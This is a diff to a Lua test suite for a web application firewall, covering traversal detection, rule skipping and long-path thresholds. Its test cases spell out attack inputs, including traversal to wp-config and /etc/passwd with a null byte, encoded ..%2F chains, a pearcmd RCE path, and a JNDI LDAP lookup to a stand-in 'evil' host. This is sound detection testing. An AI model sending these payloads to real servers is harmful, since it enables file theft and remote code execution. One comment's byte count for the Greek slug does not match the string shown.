@@ -97,7 +97,7 @@ do
   waf.set_rule("rule_rce",       "block")
 
   local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
-    uri  = "/foo/../",
+    uri  = "/foo/../wp-config",
     args = "x=${jndi:ldap://",
   }))
   check(hit == true,        "4: logonly+block — hit=true")
@@ -147,7 +147,7 @@ do
   waf.set_rule("rule_ip_host",   "logonly")
 
   local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
-    uri     = "/foo/../",
+    uri     = "/foo/../wp-config",
     headers = { ["Host"] = "10.0.0.1" },
   }))
   check(hit == true,                                                   "7: 2x logonly — hit=true")
@@ -218,7 +218,7 @@ do
   waf.set_rule("rule_traversal", "logonly")
 
   local _hit, _reason, _ttl, _action, hits = waf.check(fresh_ctx({
-    uri     = "/foo/../",
+    uri     = "/foo/../wp-config",
     headers = { ["User-Agent"] = "sqlmap/1.5.0" },
   }))
   check(#hits == 2,                          "12: hits — 2 entries")
@@ -269,7 +269,7 @@ do
   waf.set_rule("rule_rce",       "block")     -- ID 320
 
   local hit, _reason, _ttl, _action, hits, waf_rule_id = waf.check(fresh_ctx({
-    uri  = "/foo/../",
+    uri  = "/foo/../wp-config",
     args = "x=${jndi:ldap://",
   }))
   check(hit == true,                                 "15: combo — hit=true")
@@ -310,10 +310,11 @@ end
 do
   disable_all_rules()
   waf.set_rule("rule_traversal", "challenge")
-  -- Rule fires (uri = "/foo/../"), but skip_rule_ids = {[101]=true} should
-  -- suppress it as if the rule were disabled for this host.
+  -- Rule fires (uri = "/foo/../wp-config" — sensitive sink), but
+  -- skip_rule_ids = {[101]=true} should suppress it as if the rule
+  -- were disabled for this host.
   local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
-    uri = "/foo/../",
+    uri = "/foo/../wp-config",
     skip_rule_ids = { [101] = true },
   }))
   check(hit == false,                "17: skip_rule_ids — rule 101 suppressed, no hit")
@@ -329,7 +330,7 @@ do
   waf.set_rule("rule_rce",       "block")    -- ID 320 — must still fire
 
   local hit, _reason, _ttl, action, hits, rule_id = waf.check(fresh_ctx({
-    uri  = "/foo/../",
+    uri  = "/foo/../wp-config",
     args = "x=${jndi:ldap://evil/}",
     skip_rule_ids = { [101] = true },
   }))
@@ -848,18 +849,82 @@ do
   check(hit == false, "54: B1 smuggling_cl — well-formed CL, no hit")
 end
 
--- ── Test 55: B3 long_path_segment — segment ≥ 256 chars (rule 102) ──────────
+-- ── Test 54a: detect_traversal — signal-based matching (rule 101) ───────────
+-- The detector fires only on strong-signal traversal:
+--   * null bytes (raw or percent-encoded)
+--   * encoded `..%2f` / `%2e%2e/` variants
+--   * multi-hop `../../`
+--   * single `../` paired with a sensitive sink (wp-config, /etc/passwd,
+--     pearcmd, xmlrpc.php, etc.)
+-- Single `../` against benign targets (phpThumb `?src=../images/foo.jpg`)
+-- and three-or-more-dot patterns (FB share-debug `/.../x`, ellipsis CMS
+-- slugs `/pro.../x/`) must NOT fire. Mirrors the 2026-05-05 → 2026-05-11
+-- mars/virgo/orion log sample.
+do
+  disable_all_rules()
+  waf.set_rule("rule_traversal", "challenge")
+
+  local cases = {
+    -- True positives — every shape we observed in real attacks
+    { uri = "/contrib/acog/print_form.php",
+      args = "formname=../../../etc/passwd%00",
+      expect = true,  label = "TP: null byte + etc/passwd" },
+    { uri = "/wp-admin/admin-ajax.php",
+      args = "template=../xmlrpc.php&value=a",
+      expect = true,  label = "TP: ../ + xmlrpc.php sink" },
+    { uri = "/wp-admin/admin-ajax.php",
+      args = "template=../../../../../../../wp-config&value=a",
+      expect = true,  label = "TP: multi-hop + wp-config" },
+    { uri = "/wp-admin/admin-ajax.php",
+      args = "template=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config",
+      expect = true,  label = "TP: encoded ..%2F variant" },
+    { uri = "/wp-admin/admin-ajax.php",
+      args = "action=revslider_show_image&img=../wp-config.php",
+      expect = true,  label = "TP: RevSlider wp-config LFI" },
+    { uri = "/index.php",
+      args = "lang=../../../../../../../../usr/local/lib/php/pearcmd",
+      expect = true,  label = "TP: pearcmd RCE" },
+
+    -- False positives — must NOT fire
+    { uri = "/.../eyritania-roska-pantavrexi",
+      args = "",
+      expect = false, label = "FP: FB share-debug /.../" },
+    { uri = "/pro.../blouzaki-t-shirt-craft/",
+      args = "",
+      expect = false, label = "FP: CMS ellipsis slug /pro.../" },
+    { uri = "/product.../papoutsia-ergasias/",
+      args = "",
+      expect = false, label = "FP: CMS ellipsis slug /product.../" },
+    { uri = "/mparmp.../mparmpastathis-horeca.html",
+      args = "",
+      expect = false, label = "FP: CMS ellipsis slug /mparmp.../" },
+    { uri = "/.../papoutsi-ergasias-rodi.../",
+      args = "",
+      expect = false, label = "FP: trailing triple-dot /x.../"  },
+    { uri = "/thumb/phpThumb.php",
+      args = "src=../images/products/1455634838_Photo-0445.jpg&w=800&h=600",
+      expect = false, label = "FP: phpThumb single ../ to benign /images/" },
+  }
+
+  for _, c in ipairs(cases) do
+    local hit = waf.check(fresh_ctx({ uri = c.uri, args = c.args }))
+    check(hit == c.expect,
+      string.format("54a: detect_traversal — %s (uri=%s)", c.label, c.uri))
+  end
+end
+
+-- ── Test 55: B3 long_path_segment — segment ≥ 800 chars (rule 102) ──────────
 do
   disable_all_rules()
   waf.set_rule("rule_long_path_segment", "logonly")
 
-  -- 300-char segment, well over the 256 threshold.
-  local big = string.rep("A", 300)
+  -- 900-byte segment, well over the 800-byte threshold.
+  local big = string.rep("A", 900)
   local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
     uri = "/api/" .. big,
   }))
   check(hit == true,                                  "55: B3 long_path_segment — hit")
-  check(reason == "WAF_LONG_PATH:SEG_300",            "55: B3 long_path_segment — SEG_300 tag")
+  check(reason == "WAF_LONG_PATH:SEG_900",            "55: B3 long_path_segment — SEG_900 tag")
   check(action == "logonly",                          "55: B3 long_path_segment — logonly")
   check(rule_id == 102,                               "55: B3 long_path_segment — rule id 102")
 end
@@ -873,6 +938,23 @@ do
     uri = "/some/normal/path/with/many/segments/index.html",
   }))
   check(hit == false, "56: B3 long_path_segment — normal URI, no hit")
+end
+
+-- ── Test 56b: B3 long_path_segment — UTF-8 Greek slug under threshold ───────
+-- Mirrors real news1.gr / nitromag.gr product URLs that were producing
+-- SEG_319 / SEG_603 false positives at the old 256 threshold. ~700 bytes,
+-- single segment, must not fire under the 800-byte threshold.
+do
+  disable_all_rules()
+  waf.set_rule("rule_long_path_segment", "logonly")
+
+  -- 16 × 43 bytes = 688 bytes — bigger than the historical SEG_603 false
+  -- positive on news1.gr but still safely under the 800-byte threshold.
+  local greek_slug = string.rep("%CE%91%CE%BD%CF%84%CF%81%CE%B9%CE%BA%CE%AC-", 16)
+  local hit = waf.check(fresh_ctx({
+    uri = "/p/" .. greek_slug .. "/",
+  }))
+  check(hit == false, "56b: B3 long_path_segment — UTF-8 slug below 800 doesn't fire")
 end
 
 -- ── Test 57: B4 header_flood — > 16 KB of non-session headers (rule 609) ────
